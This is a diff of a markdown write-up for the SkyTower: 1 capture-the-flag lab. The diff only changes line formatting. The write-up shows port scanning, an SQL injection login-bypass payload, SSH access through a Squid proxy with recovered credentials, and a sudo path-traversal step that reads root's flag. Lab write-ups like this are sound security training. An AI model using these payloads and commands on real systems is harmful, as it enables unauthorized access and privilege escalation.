@@ -1,14 +1,14 @@
 # SkyTower: 1 Writeup
 \
 After scanning we see port 80 and 3128 open
-\
+
 ```bash
 Open 192.168.1.13:80
 Open 192.168.1.13:3128
 ```
 \
 After using nmap to fingerprint the services, we find
-\
+
 ```
 port 80    http Apache
 port 3128  http-proxy Squid http proxy 3.1.20
@@ -23,7 +23,7 @@ since there was not much in the source code as well , i tried SQL injection
 <img width="1406" height="64" alt="image" src="https://github.com/user-attachments/assets/2f4d6e5d-7d42-4c3f-9a3f-9554fbf31d2d" />
 \
 It showed an error, and the payload i used to bypass it is 
-\
+
 ```bash
 '||1=1#
 ```
@@ -37,7 +37,7 @@ we find ssh credentials john:hereisjohn , but port 22 is not open, so lets add t
 <img width="375" height="171" alt="image" src="https://github.com/user-attachments/assets/d43382ad-bf49-4d27-be5f-e6b26bcfa7bf" />
 \
 Comment the other proxies which we do not wish to use right now , now we try to access ssh by 
-\
+
 ```bash
 proxychains ssh john@192.168.1.13
 ```
@@ -46,7 +46,7 @@ but it kept closing the connection
 <img width="659" height="139" alt="image" src="https://github.com/user-attachments/assets/beaaf66c-0210-481b-8310-83c15d6dc1d4" />
 \
 So we try to change into another sh shell by using -t option
-\
+
 ```bash
 proxychains ssh john@192.168.1.13 -t '/bin/sh'
 ```
@@ -69,7 +69,7 @@ This time we have a stable shell, now we enumerate the fle system , we find a lo
 We can see that it is making a db connection to mysql using the credentials root:root and the database SkyTech
 \
 and after checking the users table in the database
-\
+
 ```bash
 +----+---------------------+--------------+
 | id | email               | password     |
@@ -89,20 +89,20 @@ after checking sudo -l, we see that sara has some specific permissions
 <img width="894" height="123" alt="image" src="https://github.com/user-attachments/assets/46ef34c1-32dc-41c6-b30e-0845a9741c05" />
 \
 the user sara can run these two commands as root user without password
-\
+
 ```bash
 /bin/cat /accounts/*
 /bin/ls /accounts/*
 ```
 \
 So , we can try path traversal 
-\
+
 ```bash
 sudo -u root /bin/ls /accounts/../root/
 ```
 \
 We find a flag.txt , so we try to read it 
-\
+
 ```bash
 sudo -u root /bin/cat /accounts/../root/flag.txt
 ```
